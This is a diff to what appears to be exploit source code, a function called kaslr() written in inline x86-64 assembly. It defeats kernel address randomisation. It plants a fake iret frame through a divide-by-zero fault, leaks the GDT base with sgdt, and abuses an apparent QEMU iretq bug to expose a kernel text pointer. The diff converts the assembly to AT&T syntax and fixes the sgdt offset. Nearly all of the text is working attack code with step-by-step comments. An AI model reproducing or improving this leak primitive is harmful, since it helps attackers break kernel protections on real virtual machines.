@@ -241,34 +241,34 @@ static const uint64_t frame_offsets[] = {
 
 static void kaslr(uint64_t frame_off) {
   __asm__ volatile(
-      ".intel_syntax noprefix\n"
-
       // Step 1: Load a recognizable landmark frame into registers R15-R12.
       // When the div-by-zero fault fires, these callee-saved regs are
       // pushed onto the kernel exception stack as pt_regs, marking a known
       // spot below the handler's return address: {RIP=0x133a000, CS=0x33,
       // RFLAGS=0x206, RSP=unused, SS=0x2b}.
-      "mov r15, 0x33\n"      // CS: user-mode code segment
-      "mov r14, 0x206\n"     // RFLAGS: IF set
-      "mov r13, 0x133a000\n" // RIP: target address (unmapped)
-      "mov r12, 0x2b\n"      // SS: user-mode stack segment
+      "movq $0x33, %%r15\n"      // CS: user-mode code segment
+      "movq $0x206, %%r14\n"     // RFLAGS: IF set
+      "movq $0x133a000, %%r13\n" // RIP: target address (unmapped)
+      "movq $0x2b, %%r12\n"      // SS: user-mode stack segment
 
       // Step 2: Trigger a divide-by-zero exception.
       // The SIGFPE handler advances RIP past this instruction.
       // The fault pushes R15-R12 (the fake iret frame) onto the
       // kernel exception stack.
-      "mov rax, 0\n"
-      "div rax\n"
+      "movq $0, %%rax\n"
+      "divq %%rax\n"
 
       // Step 3: Use `sgdt` (executable from ring 3) to leak the
       // GDT base address, then compute the address on the kernel
       // exception stack where the fault handler's return address
       // (a kernel .text pointer) sits just above the fake iret frame.
-      "push rax\n"
-      "sgdt [rsp]\n"
-      "mov rax, qword [rsp+2-8]\n" // GDT base address
-      "add rax, %[frame_off]\n" // probed offset to iret frame (frame_offsets[])
-      "mov rsp, rax\n"
+      "pushq %%rax\n"
+      "sgdt (%%rsp)\n"
+      // sgdt writes a 2-byte limit at rsp and the 8-byte base above it, so
+      // the base is at rsp+2.
+      "movq 2(%%rsp), %%rax\n"
+      "addq %[frame_off], %%rax\n" // probed offset to the iret frame
+      "movq %%rax, %%rsp\n"
 
       // Step 4: Execute iretq. Due to the QEMU bug, iretq in ring 3 reads
       // the frame from where RSP now points (the kernel exception stack) as
@@ -277,7 +277,6 @@ static void kaslr(uint64_t frame_off) {
       // then faults trying to execute that kernel .text address from ring 3.
       // The SIGSEGV handler captures it from the signal context.
       "iretq\n"
-      ".att_syntax noprefix\n"
       :
       : [frame_off] "r"(frame_off)
       : "rax", "rdx", "r12", "r13", "r14", "r15", "cc", "memory");
